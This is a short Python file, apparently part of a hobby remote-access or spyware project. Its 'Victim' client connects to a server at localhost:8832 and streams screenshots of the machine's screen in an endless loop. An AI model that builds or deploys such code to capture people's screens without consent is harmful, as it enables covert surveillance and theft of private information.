import socket
import time

from modules.protocol import Protocol, PackType
from screen_mirroring.screen_capture import ScreenShare


class Victim(Protocol):

    def __init__(self, server, port):
        Protocol.__init__(self, server, port)
        self.victim = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.screenshare = ScreenShare((1920, 1080), 'RGBA')

    def screen_share(self, conn):
        while True:
            self._send_packet(conn, PackType.FRAME, self.screenshare.frame_bytes())
            print('sent')
            time.sleep(0.01)

    def main(self):
        try:
            self.victim.connect(self.ADDR)
            self.screen_share(self.victim)
            self.victim.close()
            print('done.')
        except Exception as e:
            print(e)


if __name__ == '__main__':
    Victim('localhost', 8832).main()
